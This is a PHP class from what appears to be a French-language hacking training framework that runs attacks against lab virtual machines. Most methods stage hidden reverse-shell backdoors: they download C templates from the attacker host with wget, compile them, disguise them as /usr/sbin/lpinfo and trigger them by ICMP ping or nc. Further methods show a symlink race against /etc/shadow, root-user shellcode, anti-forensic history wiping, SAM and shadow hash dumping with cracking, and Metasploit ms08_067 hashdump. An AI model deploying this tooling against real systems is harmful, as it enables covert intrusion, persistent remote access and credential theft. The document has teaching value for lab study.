<?php
class poc4root extends poc4bof {
    
    
    public function __construct() {
        parent::__construct();
        
    }
    
    
    public function poc4backdoor8c2tcp2($attacker_port){
        $filename = "$this->dir_c/backdoor8c2tcp2.c";
        $rev_id = file_get_contents($filename);
        $rev_id = str_replace("%PORT%", $attacker_port, $rev_id);
        return $rev_id;
    }
    
    
    public function backdoor8c2tcp($sbin_path_hidden,$attacker_ip,$attacker_port){
        $filename = "$this->dir_c/backdoor8c2tcp.c";
        $rev_id = file_get_contents($filename);
        $rev_id = str_replace("%FILE%", $sbin_path_hidden, $rev_id);
        $rev_id = str_replace("%IP%", $attacker_ip, $rev_id);
        $rev_id = str_replace("%PORT%", $attacker_port, $rev_id);
        return $rev_id;
    }
    
    
    public function poc4backdoor4root2tcp4lpinfo($stream){
        $this->ssTitre(__FUNCTION__);
        $sbin_path_hidden = "/usr/sbin/lpinfo";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        $this->article("Description", "the backdoor launch the connection to the pc when it recieve the paquet
	ICMP ping with the filled fields like this :
	id 	: 1337
	code 	: 0
	type 	: 8
            
	backdoor remote connect .
	change the name procecus for hide the command ps .
	ignore signal SIGTERM SIGINT SIGQUIT SIGSTOP for don't stop the backdoor .
	redirect stderr in /dev/null for discret .
	create procecus child for execute the evil code .
	need passwd for connect backdoor .
	redirect bash history (HISTFILE) in /dev/null for the new shell .
	redirect stdout , stdin in socket client .
            
	define HIDDEN	\"/usr/sbin/lpinfo\"
	define VAR 	\"HISTFILE=/dev/null\"
	define	IP_DST	\"10.100.10.1\" // Attaquant
	define PORT	8000
	" );
        $rev_id = $this->backdoor8c2tcp($sbin_path_hidden, $attacker_ip, $attacker_port);
        $backdoor_name = "backdoor4root_tcp";
        $this->str2file($rev_id, "$this->dir_tmp/$backdoor_name.c");
        
        $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
        
        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->pause();
        
        $data = "gcc -DDETACH -DNORENAME -Wall -s -o /tmp/$backdoor_name /tmp/$backdoor_name.c ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->pause();
        $data = "ls -al /tmp/$backdoor_name ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "ps -ef | grep $backdoor_name";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "/tmp/$backdoor_name &";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -ef | grep $backdoor_name";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -aux | grep lpinfo";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -ef | grep lpinfo";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -aux | grep lpinfo";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->pause();
        
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        $shell = "/bin/bash";
        
        $cmd_rev = $this->rev8sh($attacker_ip, $attacker_port, $shell);
        $cmd = "(echo '$this->root_passwd';sleep 3;echo '$cmd_rev';sleep 3;) | sudo -S hping3 -I $this->eth -c 1 --icmptype 8 --icmp-ipid 1337 $this->ip ";
        
        $template_shell = "(echo '$this->root_passwd';sleep 3;echo '%SHELL%';sleep 3;) | sudo -S hping3 -I $this->eth -c 1 --icmptype 8 --icmp-ipid 1337 $this->ip ";
        $templateB64_shell = base64_encode($template_shell);
        $lprotocol = 'T' ;
        $type = "server";
        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
        
    }
    
    
    
    public function poc4backdoor8c2tcp2passwd(){
        $filename = "$this->dir_c/backdoor8c2tcp2passwd.c";
        $rev_id = file_get_contents($filename);
        return $rev_id;
    }
    
    
    
    
    public function poc4backdoor4root2tcp3($stream){
        $this->ssTitre(__FUNCTION__);
        
        $attacker_ip = $this->ip4addr4target($this->ip);
        
        
        $victime_port = rand(1024,65535);
        $attacker_password = $this->created_user_pass ;
        
        $rev_id = $this->backdoor8c2tcp2passwd();
        $backdoor_name = "backdoor4root_passwd";
        $this->str2file($rev_id, "$this->dir_tmp/$backdoor_name.c");
        
        $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
        
        
        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->pause();
        $data = "gcc -DDETACH -DNORENAME -Wall -s -o /tmp/$backdoor_name /tmp/$backdoor_name.c ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->pause();
        $data = "ls -al /tmp/$backdoor_name ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -ef | grep $backdoor_name";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -aux | grep $backdoor_name";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data =  "/tmp/$backdoor_name /bin/bash $victime_port $attacker_password &";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $cmd_rev = "(sleep 3;echo '$attacker_password';sleep 1;) | nc $this->ip $victime_port ";
        $templateB64_shell = base64_encode($cmd_rev);
        $lprotocol = 'T' ;
        $type = "client";
        $this->service4lan($cmd_rev, $templateB64_shell, $victime_port, $lprotocol, $type);
        
    }
    
    
 
    
    public function poc4trojan4linux_ping(){
        $this->ssTitre("Backdoor UDP qui s'active lors d'un ping et se reverse connexion vers l'attaquant sur le port 2323" );
        $this->important("Port 53 UDP -> sortir a travers le firewall" );
        $ub = new vm($this->target_vmx_name);
        $this->requette("cp -v $this->dir_c/victime_backdoor.c $this->dir_tmp/victime_backdoor.c" );
        $this->requette("gedit $this->dir_tmp/victime_backdoor.c" );
        $this->pause();
        $this->cmd($this->target_vmx_name, "nc -ul $this->attacker_port -v" );
        $ub->vm2upload("$this->dir_tmp/victime_backdoor.c", "$this->vm_tmp_lin/victime_backdoor.c");
        $this->cmd($this->target_vmx_name, "gcc -o $this->vm_tmp_lin/victime_backdoor $this->vm_tmp_lin/victime_backdoor.c  2>/dev/null;sudo $this->vm_tmp_lin/victime_backdoor" ); // tools
        $this->cmd("localhost", "ping $this->target_ip -c 1 -s 100" );
        /*
         * alert icmp any any -> any any (icmp_id: 100; msg: "ICMP ID=100";)
         * alert icmp any any -> any any (icmp_seq: 100; msg: "ICMP Sequence=100";)
         */
        
        $this->cmd($this->target_vmx_name, "sudo ps aux | grep victime_backdoor" );
        $this->important("on voit bien le nom du programme dans la liste des processus" );
        $rst = $ub->vm2process_list();
        $this->requette("cat $rst | grep victime_backdoor");
        $this->pause();
        $ub->vm2download("$this->vm_tmp_lin/victime_backdoor", "$this->dir_tmp/victime_backdoor");
        
        $check = new file("$this->dir_tmp/victime_backdoor" );
        $check->file_file2virus2vt();
        $this->pause();
    }
    
    public function poc4host4root(){
        
        // Mimikatz is an outstanding tool for extracting cleartext passwords from memory
        
        
        
        $this->start("Be a root");
        
        // ######################################################################################
        $this->gtitre("Physical access");
        // SYS (ophcrack,pwdump, boot sh)
        system_hacking ();
        /*
         * root@labs:/home/labs# locate crt0.o
         * /usr/i686-w64-mingw32/lib/gcrt0.o
         * /usr/x86_64-w64-mingw32/lib/gcrt0.o
         * see metasploit generic/debug_trap (generate a debug trap in the target preocess -> useful when inside victime
         * msfpayload windows/messagebox EXITFUNC=process ICON=INFORMATION TEXT="Blabla"
         
         * One can also list Unix Sockets by using lsof -U.
         */
        
        // #############################################################################################
        
        // #############################################################################################
        $this->gtitre("metasploit - get priv");
        // try to make .vmem + investigation
        // #############################################################################################
        
        // ######################################################################################
        $this->gtitre("Exploit");
        $this->titre("Looking for Exploit");
        $this->net("https://github.com/PenturaLabs/Linux_Exploit_Suggester");
        $this->requette("perl $this->dir_tools/root/Linux_Exploit_Suggester.pl -k 3.0.0");
        $this->requette("perl $this->dir_tools/root/Linux_Exploit_Suggester.pl -k 2.6.28");
        $this->remarque("On ne peut pas faire des mise a jours donc les derniers exploits ne seront pas integrés");
        update_exploitdb ();
        exploitdb("root");
        exploitdb("privilege");
        // #######################################################################################
        
        // ######################################################################################
        $this->gtitre("Pool Overflow");
        // wndscan - Pool scanner for window stations - volatility
        
        // ######################################################################################
        
        // ######################################################################################
        $this->gtitre("Misc");
        // ######################################################################################
    }
    
    public function poc4host4root4setuid0(){
        $this->gtitre("Shellcode Root");
        $this->titre("using setuid(0) setguid(0) -> id=0");
        
        // stack, libc, ...etc
        /*
         *
         * shell root (à condition que le binaire ai le bit suid à 1) grâce aux syscalls
         * sys_setuid, sys_setgid et execve. Il suffit donc d’appeler successivement setuid(0), setgid(0) et
         * execve(‘/bin/sh’, {‘/bin/sh’, NULL}, NULL).
         *
         * #include <stdio.h>
         *
         * int main(){
         * char *name[2];
         *
         * name[0] = "/bin/sh";
         * name[1] = 0;
         * setreuid(0,0);
         * execve(name[0], name, 0);
         * }
         */
        
        $this->gtitre("using shellcode to add user into /etc/password");
        $this->note("add user and connect to ssh with this user");
        $this->titre("On Debian");
        $this->requette("gedit $this->dir_c/root_add_root_user_with_password_143_bytes_2011-06-23_debian-sh4_2.6.32-5-sh7751r.c");
        $this->pause();
        $this->requette("gedit $this->dir_c/root_Shellcode_Linux_x86 - chmod_777_etc_passwd _etc_shadow_ Add_New_Root_User_ALI_ALI_ Execute_bin_sh.c ");
        $this->pause();
        $this->titre("Yealink VoIP phone version SIP-T38G");
        $this->img("root/Yealink_VoIP_phone_version_SIP-T38G.jpg");
        $this->requette("gedit $this->dir_doc/Yealink_VoIP_phone_version_SIP-T38G.txt");
        $this->vdo("Yealink_VoIP_phone_version_SIP-T38G.flv", 0, 165);
        $this->pause();
        
        // rajouter les buffers avec un shellsuid 0
    }
    
    public function poc4host4root4Spyware4keylog(){
        $this->gtitre("Spyware");
        keylogger_strace ();
        // Add keylogger : (software + hardware + onde)
        
        
        
        volatility_intro ();
        
        $this->titre("Memory");
        // /proc/[pid]/mem
        init_memory ();
        
        // ######################################################################################
        $this->gtitre("Commande Execution");
        // exemple du heap process -> contient les commandes -> dump password enter by user
        // ######################################################################################
    }
    
    
    public function poc4host4root4racecondition(){
        $this->chapitre("Race Condition Exploit", "");
        $this->article("Race Condition", "Les situations de concurrence (race condition) laissent plusieurs processus disposer simultanément d'une même ressource (fichier, périphérique, mémoire), alors que chacun d'eux pense en avoir l'usage exclusif.
				Cela conduit à l'existence de bogues intempestifs difficiles à déceler, mais également de véritables failles pouvant compromettre la sécurité globale du système.");
        $this->article("Principe", "Le principe général des situations de concurrence est le suivant : un processus désire accéder de manière exclusive à une ressource du système.
				Il s'assure qu'elle ne soit déjà utilisée par un autre processus, puis se l'approprie, et l'emploie à sa guise.
				Le problème survient lorsqu'un autre processus profite du laps de temps s'écoulant entre la vérification et l'accès effectif pour s'attribuer la même ressource.
				Les conséquences peuvent être très variées. Dans certains cas classiques de la théorie des systèmes d'exploitation, on se retrouve dans des situations de blocages définitifs des deux processus.
				Dans les cas plus pratiques, ce comportement mène à des dysfonctionnements parfois graves de l'application, voire à de véritables failles de sécurité quand un des processus profite indûment des privilèges de l'autre.");
        $this->pause();
        $this->requette("cat /etc/shadow");
        $this->requette("echo '$this->root_passwd' | sudo -S cat /etc/shadow");
        $this->pause();
        $this->ssTitre("Simulation de Race conditions");
        $name = "root_race_condition_1";
        $rep_path = "$this->dir_tmp/root_setuid0";
        if (file_exists($rep_path)) system("rm -rv $rep_path");
        $this->create_folder($rep_path);
        system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
        $bin = new file("$rep_path/$name.c"); // add -static
        $ret2lib = $bin->file_c2elf("-ggdb -m32 ");
        $file_bin = new bin4linux($ret2lib->file_path);
        $programme = $file_bin->file_path;
        
        $this->article("Deroulement", "le programme commence par effectuer toutes les vérifications nécessaires, s'assurant que le fichier existe, qu'il appartient à l'utilisateur et qu'il s'agit bien d'un fichier normal. Ensuite il effectue l'ouverture réelle et l'écriture du message. Et c'est là que réside la faille de sécurité ! ou plutôt c'est dans le laps de temps qui s'écoule entre la lecture des attributs du fichier avec stat() et son ouverture avec fopen(). Ce délai est peut-être infime habituellement, mais il n'est pas nul, et un attaquant peut en profiter pour modifier les caractéristiques du fichier. Pour simplifier notre attaque nous allons ajouter une ligne faisant dormir le processus entre les deux opérations, afin d'avoir le temps de faire l'intervention à la main.");
        $this->requette("echo '$this->root_passwd' | sudo -S cp -v /etc/shadow /etc/shadow.bak");
        $this->requette("ls -ail $programme");
        $this->requette("echo '$this->root_passwd' | sudo -S chown root:root $programme");
        $this->requette("echo '$this->root_passwd' | sudo -S chmod +s $programme");
        $this->requette("ls -ail $programme");
        $this->ssTitre("ouvrir un fichier qui n'appartient pas au user actuel");
        $this->requette("$programme /var/www/html/Accueil.php 'rohff' ");
        $this->requette("ls -ail /var/www/html/Accueil.php");
        $this->pause();
        
        $this->ssTitre("Current User");
        $name = "root_users_groupes";
        $rep_path = "$this->dir_tmp/root_setuid0";
        if (file_exists($rep_path)) system("rm -rv $rep_path");
        $this->create_folder($rep_path);
        system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
        $bin = new file("$rep_path/$name.c"); // add -static
        $ret2lib = $bin->file_c2elf("-ggdb -m32 ");
        $file_bin = new bin4linux($ret2lib->file_path);
        $programme = $file_bin->file_path;
        $this->requette($programme);
        $this->pause();
        
        $this->ssTitre("Real and Effectif User");
        $name = "root_user_real_effectif";
        $rep_path = "$this->dir_tmp/root_setuid0";
        if (file_exists($rep_path)) system("rm -rv $rep_path");
        $this->create_folder($rep_path);
        system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
        $bin = new file("$rep_path/$name.c"); // add -static
        $ret2lib = $bin->file_c2elf("-ggdb -m32 ");
        $file_bin = new bin4linux($ret2lib->file_path);
        $programme = $file_bin->file_path;
        $this->requette($programme);
        $this->pause();
        
        $this->requette("rm -f $rep_path/rohff_file.tmp");
        $this->requette("touch $rep_path/rohff_file.tmp");
        $this->requette("ls -ail $rep_path/rohff_file.tmp");
        $this->important("essayer de ne pas le faire sur votre Host");
        $this->cmd("localhost", "$programme $rep_path/rohff_file.tmp 'root::1:99999:::::' ");
        $this->cmd("localhost", "rm -vf $rep_path/rohff_file.tmp ; ln -s /etc/shadow $rep_path/rohff_file.tmp");
        $this->note("Pendant que le processus dort, nous avons une vingtaine de secondes pour supprimer le fichier régulier '$rep_path/rohff_file.tmp' et le remplacer par un lien (symbolique ou physique peu importe, les deux fonctionnent) vers le fichier /etc/shadow.
				Rappelons que tout utilisateur peut créer dans un répertoire lui appartenant - ou dans /tmp, comme nous le verrons plus loin - un lien vers un fichier quelconque, même s'il n'a pas le droit d'en lire le contenu.
				En revanche il n'est pas possible de créer une copie d'un tel fichier, car elle réclamerait une lecture complète.");
        $this->pause();
        $this->requette("cat /etc/shadow");
        $this->requette("echo '$this->root_passwd' | sudo -S cat /etc/shadow");
        $this->requette("echo '$this->root_passwd' | sudo -S cp -v /etc/shadow.bak /etc/shadow");
        $this->pause();
        
        
        $this->cmd($this->lts, "gcc -o $rep_path/root_soft $this->dir_c/root_soft.c");
        $this->cmd($this->lts, "gcc -o $rep_path/setuid_0 $this->dir_c/root_setuid_0.c");
        $this->cmd($this->lts, "while :; do ln -f $rep_path/root_soft $rep_path/log; ln -f $rep_path/setuid_0 $rep_path/log; done");
        $this->cmd($this->lts, "watch --interval 0,5 --exec ls -ail $rep_path/log");
        $this->cmd($this->lts, "while :; do nice -n 20 $rep_path/log; done");
        $this->pause();
        
        $this->cmd($this->lts, "ln $rep_path/root_soft $rep_path/log");
        $this->cmd($this->lts, "exec 3< $rep_path/log");
        $this->cmd($this->lts, "ls -l /proc/\$\$/fd/3");
        $this->cmd($this->lts, "rm -f $rep_path/log");
        $this->article("\$\$", "$$ pid of the current shell"); // $$ = The PID for the current process
        $this->requette("ps aux | grep `echo \$\$`");
        $this->cmd($this->lts, "ls -l /proc/$$/fd/3");
        $this->cmd($this->lts, "mv $rep_path/setuid_0 '$rep_path/log (deleted)'");
        $this->cmd($this->lts, "exec /proc/\$\$/fd/3");
        $this->cmd($this->lts, "id; whoami");
        $this->pause();
        $this->notify("END race Condition");
    }
    
    
    
    public function poc4host4root4coveringTracks() {
        $this->chapitre("covering Tracks");
        /*
         *
         *  * clearev
         * Clear the event log on the target machine.
         *
         * timestomp
         * Change file attributes, such as creation date (antiforensics measure).
         *
         * voir les liens qui recherches sur les registre + linux (rkhunter)
         *
         *
         * $this->dir_tools/3vilshell.c evilshell.c
         * the backdoor launch the connection to the pc when it recieve the paquet
         * ICMP ping with the filled fields like this :
         * id : 1337
         * code : 0
         * type : 8
         * Simple backdoor reverse connect (outside connexion from host LAN -> firewall).(80|445)
         * cryptographic connexion .
         * need passwd for connect backdoor .
         * change the name procecus for hide the command ps .
         * ignore signal SIGTERM SIGINT SIGQUIT for don't stop the backdoor .
         * redirect stderr in /dev/null for discret .
         * create procecus child for execute the evil code .
         * need passwd for connect backdoor .
         * redirect bash history (HISTFILE) in /dev/null for the new shell .
         * redirect stdout , stdin in socket client .
         *
         * find / -name "namefile" = file namefile
         * ls -aR
         * /root/.bash_history
         * /home/rohff-r6h4ck3r/.bash_history
         * /home/rohff-r6h4ck3r/.mysql_history
         * $ ctrl r -> permet de voir dans l'historique qu'on a tappe
         *
         * cat lastlog -> dernier log en SSH
         * ln -s /dev/null lastlog
         * ln -s .bash_history /dev/null
         * unset HISTORY
         *
         * vdo("cover_track.flv");
         *
         * Linux
         * To be perfectly honest, the post-exploitation module-set for Linux hosts is really lacking. Part
         * of this could be due to the strength of the shell you get right out of the box on Linux hosts,
         * allowing you much more functionality out of your shell than, say, a Windows command prompt.
         * This shouldn’t be an excuse, however. For full integration with the framework, many functions
         * of the shell could easily be implemented as post modules and saved to the database for later
         * processing.
         * Post modules to collect files of interest such as ~/.bash_history, ~/.ssh/, known_hosts, .bashrc,
         * etc.. would be immensely useful if integrated into the framework via loot. In a later section, I
         * will supply resources to help bridge this gap in Metasploit. However, simply bridging this gap
         * with duct tape isn’t a very fruitful way of dealing with the problem. Techniques described in later
         * sections for bridging these gaps should be implemented within post modules if at all possible.
         * Integration with the framework is key to having a fluid, straight-forward idea of exploiting your
         * target later.
         */
    }
    
    
    // ############################ CRACK ############################################
    public function poc4host4root4crackingPassword() {
        // Ajouter les ranbow tables
        
        
        // rambow table -> site web
        $this->net("http://ophcrack.sourceforge.net/tables.php");
        $this->net("http://project-rainbowcrack.com/table.htm");
        $this->net("http://fr.wikipedia.org/wiki/Rainbow_table");
        $this->pause();
        $this->titre("Cracking tools");
        $this->ssTitre("John The Ripper");
        $this->net("http://www.openwall.com/john/");
        $this->pause();
        $this->img("crack/passwords_cracking.jpg");
        $this->ssTitre("Passwords Formats");
        $this->requette("cd /opt/john-1.8.0/run/; ./john");
        $this->pause();
        $this->titre("Cracking Windows Passwords Formats");
        $this->article("SAM File", "C'est le fichier qui va contenir, les informations de sessions : les mots de pass y compris.
Il faut savoir que ce fichier est biensure, illisible, et inaccessible lorsque nous sommes sur notre session.
Il est 'verrouillé' par le systeme.
		Windows 95, 98 -> fichier .pwl
		Windows NT -> C:\windows\system32\config\ -> sam._
Il existe donc deux alternatives pour nous :
		- L'on boot sur une distribution linux par exemple, où l'on va copier le sam sur un périphérique de stockage.
		- On utilise un outil comme pwdump.");
        $this->pause();
        $this->ssTitre("Dump SAM (NTML Hashes) ");
        $this->ssTitre("PwDump");
        $this->net("http://passwords.openwall.net/a/pwdump/pwdump7.zip");
        $this->cmd($this->xp, "C:\pwdump7\PwDump7.exe");
        $this->pause();
        $this->ssTitre("Dump SHADOW");
        ssh($this->msf, "root", "rohff", 'cat /etc/shadow');
        $this->pause();
        $this->requette("gedit $this->dir_tools/crack/crack_sam.txt $this->dir_tools/crack/crack_shadow.txt ");
        $this->pause();
        $this->requette("wc -l $this->dir_tools/dico/2M_passwd.lst");
        $this->pause();
        system("cd /opt/john-1.8.0/run/; sudo rm -v `ls *.rec` `ls *.log` `ls *.pot` ");
        $this->article("tload", "affiche la charge CPU sous forme de graphique");
        $this->cmd("localhost", "tload");
        $this->pause();
        $this->ssTitre("Crack Password SAM");
        $this->cmd("localhost", "cd /opt/john-1.8.0/run/ ;sudo ./john $this->dir_tools/crack/crack_sam.txt --session=$this->dir_tmp/sam.pot --fork=6 --wordlist:\"$this->dir_tools/dico/2M_passwd.lst\" ");
        $this->ssTitre("Crack Password SHADOW");
        $this->cmd("localhost", "cd /opt/john-1.8.0/run/ ;sudo ./john $this->dir_tools/crack/crack_shadow.txt --session=$this->dir_tmp/shadow.pot --fork=11 --wordlist:\"$this->dir_tools/dico/2M_passwd.lst\" ");
        $this->pause();
        $this->ssTitre("Show Results");
        $this->requette("cd /opt/john-1.8.0/run/ ;sudo ./john --show $this->dir_tools/crack/crack_sam.txt");
        $this->requette("cd /opt/john-1.8.0/run/ ;sudo ./john --show $this->dir_tools/crack/crack_shadow.txt");
        $this->pause();
        $this->ssTitre("Other way to get NTLM Hash");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi RHOST=\"$this->xp\" TARGET=25 AutoRunScript=\"hashdump\" E");
        $this->pause();
        $this->ssTitre("MSF with John");
        $query = "echo \"db_status\n use exploit/windows/smb/ms08_067_netapi\n set RHOST \"$this->xp\"\nset TARGET 25\nset AutoRunScript \"hashdump\"\nrun\n use auxiliary/analyze/jtr_crack_fast\n run\n \" > $this->dir_tmp/ntlm_hash_john.rc";
        $this->requette($query);
        $this->requette("cat $this->dir_tmp/ntlm_hash_john.rc");
        $this->pause();
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/ntlm_hash_john.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
        $this->pause();
        // ssTitre("SMB no cracking Password Need, just need the Password NTLM Hash");
        // cmd("localhost","echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/psexec RHOST=\"$this->xp\" SMBPass=\"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\" SMBUser=\"Administrateur\" E");
        // cmd("localhost","echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/psexec RHOST=\"$this->xp\" SMBPass=\"bce739534ea4e445aad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157\" SMBUser=\"rohff\" E");
        // pause();
        $this->ssTitre("Cracking Password Online");
        $this->net("https://crackstation.net/");
        $this->net("http://www.hashkiller.co.uk/ntlm-decrypter.aspx");
        
        
        
        
        $this->article("Brute-force Attack Countermeasure", "
		The best defense for brute-force guessing is to use strong passwords that are not easily
		guessed. A one-time password mechanism would be most desirable. Some free utilities
		that will help make brute forcing harder to accomplish are listed in Table 5-1.
		Newer UNIX operating systems include built-in password controls that alleviate
		some of the dependence on third-party modules. For example, Solaris 10 provides a
		number of options through /etc/default/passwd to strengthen a systems password
		policy including:
		• PASSLENGTH		Minimum password length
		• MINWEEK		Minimum number of weeks before a password can be changed
		• MAXWEEK		Maximum number of weeks before a password must be changed
		• WARNWEEKS Number of weeks to warn a user ahead of time their password is about to expire
		• HISTORY Number of passwords stored in password history.
		User will not be allowed to reuse these values
		• MINALPHA		Minimum number of alpha characters
		• MINDIGIT		Minimum number of numerical characters
		• MINSPECIAL		Minimum number of special characters (nonalpha,nonnumeric)
		• MINLOWER		Minimum number of lowercase characters
		• MINUPPER		Minimum number of uppercase characters
            
		The default Solaris install does not provide support for pam_cracklib or pam_
		passwdqc. If the OS password complexity rules are insufficient, then one of the PAM
            
		modules can be implemented. Whether you rely on the operating system or third-party products, it is important that you implement good password management procedures
		and use common sense. Consider the following:
		• Ensure all users have a password that conforms to organizational policy.
		• Force a password change every 30 days for privileged accounts and every 60 days for normal users.
		• Implement a minimum password length of eight characters consisting of at least one alpha character, one numeric character, and one nonalphanumeric character.
		• Log multiple authentication failures.
		• Configure services to disconnect clients after three invalid login attempts.
		• Implement account lockout where possible. (Be aware of potential denial of service issues of accounts being locked out intentionally by an attacker.)
		• Disable services that are not used.
		• Implement password composition tools that prohibit the user from choosing a poor password.
		• Don’t use the same password for every system you log into.
		• Don’t write down your password.
		• Don’t tell your password to others.
		• Use one-time passwords when possible.
		• Don’t use passwords at all. Use public key authentication.
		• Ensure that default accounts such as “setup” and “admin” do not have default passwords.");
        
        
        
        /*
         * labs@labs:~/Bureau/CEH$ grep MemTotal /proc/meminfo
         * MemTotal: 16264080 kB
         * grep SwapTotal /proc/meminfo
         * sudo lshw
         * cat /proc/cpuinfo
         * free -m : info mémoire
         * vmstat : info ram, swap, cpu
         *
         */
        
        
        $this->gtitre("Working with Memory");
        $this->titre("Analyse RAM");
        $this->article("Analyse de la RAM", "
La première question qu’on peut se poser c’est pourquoi analyser la mémoire et ne pas se contenter de la récupération d’une image du disque ? La réponse est tout simplement que la mémoire RAM peut contenir :
            
    Les processus légitime et les malwares,
    Les URL, les adresses IP, les connexions réseaux,
    Les fichiers,
    Le contenu du presse-papier,
    Les clés de chiffrement et les mots de passe,
    Les dll chargées,
    Les clés de registre.
            
Ce qui nous permet en cas de détection rapide d’un comportement malveillant d’étudier la configuration du système en cours d'exécution, de comprendre le fonctionnement du malware même si le code est offusqué, d’élaborer un déroulement chronologique des événments
Un autre avantage d’un dump mémoire est que les malwares sont en cours d’exécution ce qui permet de voir les chaînes de caractères utilisées comme par exemple les adresses command and control (C&C) ; dans ce cas les chaînes sont la plupart du temps en clair dans la mémoire.
Il faut préciser que lorsqu’un appareil est soupçonné d’être infecté, nous ne pouvons plus faire confiance aux résultats fournis par les commandes ou les utilitaires installés car ceux-ci risquent d’être compromis. Pour cela, un moyen qui permet d’avoir un résultat correct sans trop polluer le système consiste à utiliser nos propres outils d’analyses et faire nos investigations sur une autre machine après avoir bien évidement récupéré le dump mémoire à analyser. ");
        
        os_get_memory ();
        
        
        $vmem = "$this->dir_tools/memory/xp-laptop_WinXPSP2x86-2005-06-25.vmem";
        $this->profile = "WinXPSP2x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $vmem = "$this->dir_tools/memory/xp-laptop_WinXPSP2x86-2005-07-04-1430.vmem";
        $this->profile = "WinXPSP2x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $vmem = "$this->dir_tools/memory/boomer-Win2003SP0x86-2006-03-17.vmem";
        $this->profile = "Win2003SP0x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $vmem = "$this->dir_tools/memory/Win7SP1x86_Trojan_DarkComet_RAT.vmem";
        $this->profile = "Win7SP1x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $vmem = "$this->dir_tools/memory/Win2008SP1x86.vmem";
        $this->profile = "Win2008SP1x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $vmem = "$this->dir_tools/memory/spyeye_WinXPSP2x86.vmem";
        $this->profile = "WinXPSP2x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $vmem = "$this->dir_tools/memory/stuxnet_WinXPSP3x86.vmem";
        $this->profile = "WinXPSP3x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $vmem = "$this->dir_tools/memory/zeus_WinXPSP2x86.vmem";
        $this->profile = "WinXPSP2x86";
        win_Information_sam_file($rep_path, $vmem, $this->profile);
        $this->titre("Password SAM");
        $this->requette("cat $this->dir_tmp/sam.hash | sort | uniq > $this->dir_tmp/crack_sam.txt");
        $this->requette("cat -n $this->dir_tmp/crack_sam.txt");
        $this->ssTitre("Crack Password SAM");
        $this->cmd("localhost", "cd /opt/john-1.8.0/run/ ;sudo ./john $this->dir_tmp/crack_sam.txt --session=$this->dir_tmp/sam.pot --fork=6 --wordlist:\"$this->dir_tools/dico/2M_passwd.lst\" ");
        $this->ssTitre("Show Results");
        $this->requette("cd /opt/john-1.8.0/run/ ;sudo ./john --show $this->dir_tmp/crack_sam.txt");
        
        
        $this->requette("strings $vmem | grep -i $chaine ");
        
        
    }
    // ###################################################################################
    
    
    public function poc4root2rootkit4userland2azazel(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.154"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        $user_name_created = "insecurity" ;
        $user_name_pass = "P@ssw0rd";
        $user_name_created = "root" ;
        $user_name_pass = "secret123";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
    public function poc4root2rootkit4userland2jynx2(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // DSL
        $port = "22";
        $protocol = "T";
        $user_name_created = "root" ;
        $user_name_pass = "dsl";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
    public function poc4root2rootkit4kerneland2tyton(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // DVL
        $port = "22";
        $protocol = "T";
        $user_name_created = "root" ;
        $user_name_pass = "toor";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
